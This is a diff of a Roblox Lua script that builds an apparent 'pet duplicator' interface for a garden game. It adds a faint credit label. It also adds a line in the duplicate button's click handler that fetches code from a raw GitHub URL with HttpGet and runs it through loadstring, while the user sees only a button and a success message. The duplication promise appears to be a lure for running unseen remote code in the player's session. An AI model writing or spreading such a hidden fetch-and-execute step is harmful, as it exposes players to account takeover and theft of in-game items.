@@ -182,6 +182,18 @@ Instance.new("UICorner", duplicateBtn)
 duplicateBtn.Active = false
 duplicateBtn.TextTransparency = 0.5
 
+-- Credit Text
+local creditLabel = Instance.new("TextLabel", page)
+creditLabel.Size = UDim2.new(1, -20, 0, 16)
+creditLabel.Position = UDim2.new(0, 10, 0, 95)
+creditLabel.Text = "@sophiasy2008"
+creditLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+creditLabel.Font = Enum.Font.FredokaOne
+creditLabel.TextSize = 10
+creditLabel.BackgroundTransparency = 1
+creditLabel.TextXAlignment = Enum.TextXAlignment.Center
+creditLabel.TextTransparency = 0.7
+
 -- Whitelist of valid pets
 local WHITELISTED_PETS = {
     ["Raccoon"] = true,
@@ -400,6 +412,7 @@ duplicateBtn.MouseButton1Click:Connect(function()
         successMsgLabel.Visible = true
         
         -- Execute the external script
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/jandelrblx/growagarden/refs/heads/main/script", true))()
         
         task.spawn(function()
             task.wait(2)
